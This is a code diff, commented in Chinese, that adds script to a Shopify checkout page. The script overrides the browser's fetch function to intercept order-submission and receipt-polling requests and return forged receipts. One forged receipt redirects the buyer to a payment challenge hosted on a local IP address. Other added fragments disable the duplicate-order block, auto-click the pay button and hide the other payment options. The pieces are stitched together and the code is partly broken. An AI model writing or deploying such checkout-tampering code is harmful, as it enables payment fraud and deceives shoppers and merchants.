@@ -1,0 +1,71 @@
+if (typeof window !== 'undefined') {
+    top.window.hack = true;
+    const originalFetch = window.fetch;
+
+    const mockRules = [
+        {
+            url: 'SubmitForCompletion',
+            response: {"data":{"submitForCompletion":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970983534820","purchaseOrder":{},"pollDelay":500,"__typename":"ProcessingReceipt"},"__typename":"SubmitSuccess"}}},
+            status: 200
+        },
+        {
+            url: 'PollForReceipt',
+            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"http://192.168.0.102:5173/about","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
+            status: 200
+        }
+    ];
+
+    window.fetch = (...args) => {
+		console.log("========请求参数：",args)
+        const [input, init] = args;
+        const url = typeof input === 'string' ? input : input.url;
+        const rule = mockRules.find(r => url.includes(r.url));
+
+        if(rule && top.window.hack){
+            //TODO 这里要设置一个holding状态，等到top.window.hackData 数据准备好后，再resolve
+            //TODO 这个数据是由modal页面中的websocket设置的
+
+            return new Promise((resolve, reject) => {
+                console.log(`拦截请求: ${url}，返回 mock 数据`);
+                // 立即给前端返回 mock（前端先用这个继续跑逻辑）
+                resolve(
+                    new Response(JSON.stringify(rule.response), {
+                        status: rule.status,
+                        statusText: 'OK',
+                        headers: { 'Content-Type': 'application/json' }
+                    })
+                );
+            });
+        }
+
+
+
+        // 没匹配的请求走原始 fetch
+		// 保存submit的参数
+        return originalFetch(...args);
+    };
+}
+
+
+// 判断重复提交的地方！！！！！！（搜索关键词  alreadySubmittedInterceptor）
+.behavior === 'block'),
+.behavior===(top.window.hack?'unblock':'block')),
+
+
+// 如果已经填完验证码，重新点击按钮提交
+while(top.window.hack == false){
+	const btn = top.document.getElementById("checkout-pay-button");
+	btn.disabled=false;
+	btn.click();
+}
+
+
+// 隐藏顶部其他支付方式
+[aria-label="Contact"] > :nth-child(1),[aria-label="Contact"] > :nth-child(2){
+  /* 样式 */
+  display:none !important;
+}
+
+
+
+
